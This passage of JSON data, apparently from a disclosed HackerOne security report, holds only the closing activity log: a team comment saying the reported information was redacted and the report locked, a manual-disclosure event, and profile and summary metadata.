          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8276142,
      "is_internal": false,
      "editable": false,
      "type": "Activities::CommentsClosed",
      "message": "Hi @what_web - we've redacted the information you pointed out. We're now locking the report to avoid further discussion on this ticket since it's been resolved and it's ready to be disclosed. Thanks again for bringing this to our attention, this was a good find and a fun bug to dive into. Good luck and happy hacking!",
      "automated_response": false,
      "created_at": "2020-06-12T18:08:32.654Z",
      "updated_at": "2020-06-12T18:08:32.654Z",
      "actor": {
        "url": "/security",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "HackerOne"
        }
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8276143,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ManuallyDisclosed",
      "message": "",
      "automated_response": false,
      "created_at": "2020-06-12T18:08:43.534Z",
      "updated_at": "2020-06-12T18:08:43.534Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}